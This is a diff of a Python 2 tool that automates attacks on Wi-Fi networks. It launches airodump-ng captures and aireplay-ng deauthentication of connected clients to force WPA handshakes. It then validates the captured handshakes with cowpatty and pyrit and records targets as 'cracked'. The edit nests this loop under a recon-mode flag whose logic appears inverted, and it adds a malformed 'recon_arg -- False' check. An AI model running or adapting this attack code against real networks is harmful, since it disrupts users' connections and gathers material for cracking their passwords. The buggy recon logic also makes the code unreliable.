@@ -314,112 +314,116 @@ if __name__ == '__main__':
 				scan_list = [x for x in sort_list if x not in ignore_aps]
 				print "Suitable Wifi APs for handshake detection:", scan_list
 				for AP in scan_list:
-					if recon_arg == True:
-						print colored("Recon mode enabled, de-auth bypassed:", 'red'), colored(AP[0], 'yellow')
-						break
-					f_xml = xml_machine(target_dir+AP[0]+".xml")
-					f_xml.parse_deets()
-#start airodump-ng focussed attack using deets parsed from xml
-					print colored("Creating focussed scanner object:", 'green'), colored(f_xml.name, 'yellow')
-					f_scanner = scanner(iface)
-					f_airodump_parent_conn, f_airodump_child_conn = Pipe()  #should these pipes be setup witin scanner method?
-					deauth_parent_conn, deauth_child_conn = Pipe()          #should these pipes be setup witin scanner method?
-					f_airodump = Process(target=f_scanner.scan, kwargs={    #couldn't they just be a clas attribute of scanner?
-					'out_format':'pcap', 
-					'out_dest':handshake_dir, 
-					'channel':f_xml.channel,
-					'conn':f_airodump_child_conn,
-					'essid':f_xml.name})
-					f_deauth = Process(target=f_scanner.deauth, kwargs={ 
-					'essid':f_xml.name,
-					'bssid':f_xml.bssid,
-					'client_MAC':(f_xml.client_list),   #expects a list
-					'conn':deauth_child_conn})
-#start airodump-ng process - focussed this time. Captures any 4 way hadnshakes.
-					f_scanner.set_channel(f_xml.channel)
-					f_airodump.start()
-#start aireplay-ng process with deauth method. Deauths clients to force handshaking procedure.
-					f_deauth.start()
-					f_scanner.state = True
-					f_scanning = True
-					handshake_count = 0
-					while f_scanner.state == True:
-						f_airodump_parent_conn.send(f_scanner.state)
-						deauth_parent_conn.send(f_scanner.state)
-						deauth = deauth_parent_conn.recv()
-						time.sleep(8)   #optimise this time based on packet captures time plots
-						if deauth == True:
-							files_handshake = os.listdir(handshake_dir)
-							for files in files_handshake:       
-#scan pcap file for valid handshake EAPOL packets
-								handshake_file = (handshake_dir+files)
-								if (handshake_dir+f_xml.name+"_scan") in handshake_file:
-									valid = validator(SSID=(f_xml.name), 
-									BSSID=(f_xml.bssid), 
-									capfile=(handshake_file))
-									valid.validate_handshake()
-									valid.analyze()
-									print colored("Validation (cowpatty) result of handshake capture:", 'red') 
-									print colored(valid.validation_result, 'red')
-									print colored("Analysis (pyrit) result of handshake capture:", 'red')
-									print colored(valid.analyze_result, 'red')
-									handshake_count = (handshake_count+1)
-#when handshake detected stop focussed attack           
-									if valid.validation_result or valid.analyze_result == True:         
-										print colored("Handshake captured, my job here is done...", 'cyan', 'on_magenta') 
-										f_xml.cracked = 'True'
-										f_xml.xml_tree()
-										f_xml.xml_write(target_dir+f_xml.name+'.xml')   
-										f_scanner.state = False
-										f_airodump_parent_conn.send(f_scanner.state)
-										deauth_parent_conn.send(f_scanner.state)
-										f_airodump_parent_conn.close()
-										deauth_parent_conn.close()
-										time.sleep(1)                                           
-										os.rename(valid.capfile, (handshake_dir+valid.SSID+'_GOOD.cap'))   #untested
-										#
-										#strip pcap file here if you have to...
-										#print colored("Stripping handshake PCAP file of unnecessary packets:", 'red')
-										#print colored(handshake_dir+valid.SSID+'_GOOD.cap', 'red')
-										strip_valid = validator(SSID=(f_xml.name), 
+					print("********DEBUG: AP:", AP)
+					#if recon_arg == True:
+					#	print colored("Recon mode enabled, de-auth bypassed:", 'red'), colored(AP[0], 'yellow')
+					#	break
+					if recon_arg != False:
+						f_xml = xml_machine(target_dir+AP[0]+".xml")
+						f_xml.parse_deets()
+	#start airodump-ng focussed attack using deets parsed from xml
+						print colored("Creating focussed scanner object:", 'green'), colored(f_xml.name, 'yellow')
+						f_scanner = scanner(iface)
+						f_airodump_parent_conn, f_airodump_child_conn = Pipe()  #should these pipes be setup witin scanner method?
+						deauth_parent_conn, deauth_child_conn = Pipe()          #should these pipes be setup witin scanner method?
+						f_airodump = Process(target=f_scanner.scan, kwargs={    #couldn't they just be a clas attribute of scanner?
+						'out_format':'pcap', 
+						'out_dest':handshake_dir, 
+						'channel':f_xml.channel,
+						'conn':f_airodump_child_conn,
+						'essid':f_xml.name})
+						f_deauth = Process(target=f_scanner.deauth, kwargs={ 
+						'essid':f_xml.name,
+						'bssid':f_xml.bssid,
+						'client_MAC':(f_xml.client_list),   #expects a list
+						'conn':deauth_child_conn})
+	#start airodump-ng process - focussed this time. Captures any 4 way hadnshakes.
+						f_scanner.set_channel(f_xml.channel)
+						f_airodump.start()
+	#start aireplay-ng process with deauth method. Deauths clients to force handshaking procedure.
+						f_deauth.start()
+						f_scanner.state = True
+						f_scanning = True
+						handshake_count = 0
+						while f_scanner.state == True:
+							f_airodump_parent_conn.send(f_scanner.state)
+							deauth_parent_conn.send(f_scanner.state)
+							deauth = deauth_parent_conn.recv()
+							time.sleep(8)   #optimise this time based on packet captures time plots
+							if deauth == True:
+								files_handshake = os.listdir(handshake_dir)
+								for files in files_handshake:       
+	#scan pcap file for valid handshake EAPOL packets
+									handshake_file = (handshake_dir+files)
+									if (handshake_dir+f_xml.name+"_scan") in handshake_file:
+										valid = validator(SSID=(f_xml.name), 
 										BSSID=(f_xml.bssid), 
-										capfile=(handshake_dir+valid.SSID+'_GOOD.cap'))
-										strip_valid.strip(handshake_dir+valid.SSID+'_GOOD_strip.cap')
-										strip_valid.validate_handshake()
-										strip_valid.analyze()
-										if strip_valid.validation_result or strip_valid.analyze_result ==True:
-											print colored("Deleting source PCAP file...", 'red')
-											os.remove(handshake_dir+valid.SSID+'_GOOD.cap')
-										break
-									else:
-										#delete uneeded pcap files and continue
-										if handshake_count >= 3:
-											for file in  files_handshake:
-											#test for filename without word "good" in it 
-												file_string = str(file)
-												good_test = file_string.find("GOOD")
-												if good_test == -1:
-													try:
-														print "Deleting useless handshake file:", (handshake_dir+file)
-														os.remove(handshake_dir+file)        
-													except OSError:
-														pass
-#time-out in case no handshakes are captured
-##make this option (length in seconds) controllable via args???         
-						if f_scanner.state == True:
-							print "Focussed attack now running for: %.0f seconds" % (time.time() - f_scanner.start_time)
-							if time.time() - f_scanner.start_time >= 30:
-								print "Times up, aborting focussed attack..."
-								f_xml.cracked = 'Timeout'
-								#print "testing here:", f_xml.cracked        #debug
-								f_xml.xml_tree()
-								f_xml.xml_write(target_dir+f_xml.name+'.xml')   
-								f_scanner.state = False
-								f_airodump_parent_conn.send(f_scanner.state)
-								deauth_parent_conn.send(f_scanner.state)
-								f_airodump_parent_conn.close()
-								deauth_parent_conn.close()
-								break                      
+										capfile=(handshake_file))
+										valid.validate_handshake()
+										valid.analyze()
+										print colored("Validation (cowpatty) result of handshake capture:", 'red') 
+										print colored(valid.validation_result, 'red')
+										print colored("Analysis (pyrit) result of handshake capture:", 'red')
+										print colored(valid.analyze_result, 'red')
+										handshake_count = (handshake_count+1)
+	#when handshake detected stop focussed attack           
+										if valid.validation_result or valid.analyze_result == True:         
+											print colored("Handshake captured, my job here is done...", 'cyan', 'on_magenta') 
+											f_xml.cracked = 'True'
+											f_xml.xml_tree()
+											f_xml.xml_write(target_dir+f_xml.name+'.xml')   
+											f_scanner.state = False
+											f_airodump_parent_conn.send(f_scanner.state)
+											deauth_parent_conn.send(f_scanner.state)
+											f_airodump_parent_conn.close()
+											deauth_parent_conn.close()
+											time.sleep(1)                                           
+											os.rename(valid.capfile, (handshake_dir+valid.SSID+'_GOOD.cap'))   #untested
+											#
+											#strip pcap file here if you have to...
+											#print colored("Stripping handshake PCAP file of unnecessary packets:", 'red')
+											#print colored(handshake_dir+valid.SSID+'_GOOD.cap', 'red')
+											strip_valid = validator(SSID=(f_xml.name), 
+											BSSID=(f_xml.bssid), 
+											capfile=(handshake_dir+valid.SSID+'_GOOD.cap'))
+											strip_valid.strip(handshake_dir+valid.SSID+'_GOOD_strip.cap')
+											strip_valid.validate_handshake()
+											strip_valid.analyze()
+											if strip_valid.validation_result or strip_valid.analyze_result ==True:
+												print colored("Deleting source PCAP file...", 'red')
+												os.remove(handshake_dir+valid.SSID+'_GOOD.cap')
+											break
+										else:
+											#delete uneeded pcap files and continue
+											if handshake_count >= 3:
+												for file in  files_handshake:
+												#test for filename without word "good" in it 
+													file_string = str(file)
+													good_test = file_string.find("GOOD")
+													if good_test == -1:
+														try:
+															print "Deleting useless handshake file:", (handshake_dir+file)
+															os.remove(handshake_dir+file)        
+														except OSError:
+															pass
+	#time-out in case no handshakes are captured
+	##make this option (length in seconds) controllable via args???         
+							if f_scanner.state == True:
+								print "Focussed attack now running for: %.0f seconds" % (time.time() - f_scanner.start_time)
+								if time.time() - f_scanner.start_time >= 30:
+									print "Times up, aborting focussed attack..."
+									f_xml.cracked = 'Timeout'
+									#print "testing here:", f_xml.cracked        #debug
+									f_xml.xml_tree()
+									f_xml.xml_write(target_dir+f_xml.name+'.xml')   
+									f_scanner.state = False
+									f_airodump_parent_conn.send(f_scanner.state)
+									deauth_parent_conn.send(f_scanner.state)
+									f_airodump_parent_conn.close()
+									deauth_parent_conn.close()
+									break                      
+					if recon_arg -- False:
+						print colored("Recon mode enabled, de-auth bypassed:", 'red'), colored(AP[0], 'yellow')		
 				print "?????? here now..."
 			else:
 				print "No suitable networks detected."
